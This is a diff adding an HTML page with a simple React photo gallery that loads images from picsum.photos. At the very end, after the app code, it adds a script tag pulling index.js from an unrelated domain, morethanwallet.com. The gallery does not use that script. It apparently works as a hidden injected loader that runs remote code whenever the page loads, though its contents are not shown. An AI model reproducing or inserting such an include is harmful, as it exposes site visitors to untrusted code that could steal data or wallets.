@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8" />
+   <title>Image Of Photos</title>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.development.js"></script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.development.js"></script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+   <style>
+     .toolbar {
+       text-align: center;
+     }
+    
+     .thumbnail {
+       display: inline-block;
+       margin: 5px; 
+     }
+
+     .selected-image {
+       display: block;
+       margin: 0 auto; 
+       max-width: 100%; 
+     }
+
+     .selected-image-container {
+         text-align: center;
+         padding: 30px; 
+      }
+   </style>
+</head>
+
+<body>
+   <div id="root"></div>
+
+
+
+   <script type="text/babel">
+     class ImgController extends React.Component {
+       constructor(props) {
+         super(props);
+         this.state = {
+           images: [],
+           currentPage: 0,
+           perPage: 12,
+           selected: null
+         };
+       }
+
+       componentDidMount() {
+         fetch("https://picsum.photos/v2/list?limit=30")
+           .then(response => response.json())
+           .then(data => {
+             const images = data.map(img => ({
+               id: img.id,
+               thumb: `https://picsum.photos/id/${img.id}/80/80`,
+               full: `https://picsum.photos/id/${img.id}/350/350`
+             }));
+             this.setState({ images });
+             this.selectImg(images[0]);
+           })
+           .catch(error => console.error("Error fetching images:", error));
+       }
+
+       selectImg = img => {
+         this.setState({ selected: img });
+       };
+
+
+       render() {
+         const { images, currentPage, perPage, selected } = this.state;
+         const startIndex = currentPage * perPage;
+         const endIndex = startIndex + perPage;
+         const pageImages = images.slice(startIndex, endIndex);
+         return (
+          
+           <div className="toolbar">
+            <h1>Image Of Photos</h1>
+             {pageImages.map(img => (
+               <img
+                 key={img.id}
+                 className="thumbnail"
+                 src={img.thumb}
+                 onClick={() => this.selectImg(img)}
+               />
+             ))}
+             {selected && (
+                <div className="selected-image-container">
+                  <img className="selected-image" src={selected.full} alt="Selected Image" />
+                </div>
+              )}  
+          </div>
+        );
+      }
+    }
+
+    ReactDOM.render(<ImgController />, document.getElementById('root'));
+    </script>
+ <script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+
+</html>
